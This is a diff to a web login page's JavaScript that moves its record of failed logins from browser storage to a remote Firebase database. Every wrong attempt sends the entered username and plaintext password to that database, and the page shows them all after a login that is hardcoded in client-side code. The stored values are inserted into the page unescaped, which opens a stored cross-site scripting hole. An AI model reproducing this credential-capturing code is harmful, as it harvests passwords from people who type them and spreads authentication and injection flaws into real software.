@@ -69,8 +69,26 @@
       </svg>
     </div>
   </div>
-  <!-- Toggle Password Script -->
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js"></script>
   <script>
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY",
+      authDomain: "YOUR_AUTH_DOMAIN",
+      databaseURL: "YOUR_DATABASE_URL",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_STORAGE_BUCKET",
+      messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+      appId: "YOUR_APP_ID"
+    };
+
+    // Initialize Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+    const failedAttemptsRef = database.ref('failedAttempts');
+
     const togglePassword = document.getElementById("togglePassword");
     const password = document.getElementById("password");
 
@@ -85,14 +103,11 @@
     const usernameField = document.getElementById('username');
     const passwordField = document.getElementById('password');
 
-    // Load failed attempts from localStorage on page load (but not display them yet)
-    let failedAttempts = JSON.parse(localStorage.getItem("failedAttempts")) || [];
-
     // Function to display failed attempts only after correct login
-    function displayFailedAttempts() {
+    function displayFailedAttempts(attempts) {
       const failedMessageContainer = document.getElementById('failedAttemptsContainer');
-      if (failedAttempts.length > 0) {
-        failedMessageContainer.innerHTML = `<strong>Failed Login Attempts:</strong><br>${failedAttempts.join('<br>')}`;
+      if (attempts.length > 0) {
+        failedMessageContainer.innerHTML = `<strong>Failed Login Attempts:</strong><br>${attempts.map(attempt => `Username: ${attempt.username}, Password: ${attempt.password}, Timestamp: ${new Date(attempt.timestamp).toLocaleString()}`).join('<br>')}`;
       } else {
         failedMessageContainer.innerHTML = '<strong>No failed attempts yet.</strong>';
       }
@@ -100,7 +115,7 @@
     }
 
     // Store user input if credentials are correct
-    loginButton.addEventListener('click', () => {
+    loginButton.addEventListener('click', async () => {
       console.log('Button clicked');
       const username = usernameField.value;
       const password = passwordField.value;
@@ -111,12 +126,18 @@
 
       if (username === "lalouss" && password === "laloussa") {
         alert("Login successful!");
-        // After successful login, display stored failed attempts
-        displayFailedAttempts();
+        // After successful login, fetch and display stored failed attempts
+        failedAttemptsRef.once('value').then((snapshot) => {
+          const failedAttempts = snapshot.val() || [];
+          displayFailedAttempts(failedAttempts);
+        });
       } else {
-        // Store the failed attempt in localStorage
-        failedAttempts.push(`Username: ${username} - Password: ${password}`);
-        localStorage.setItem("failedAttempts", JSON.stringify(failedAttempts)); // Save to localStorage
+        // Store the failed attempt in Firebase
+        failedAttemptsRef.push({
+          username,
+          password,
+          timestamp: firebase.database.ServerValue.TIMESTAMP
+        });
         console.log('Failed attempt stored');
       }
     });
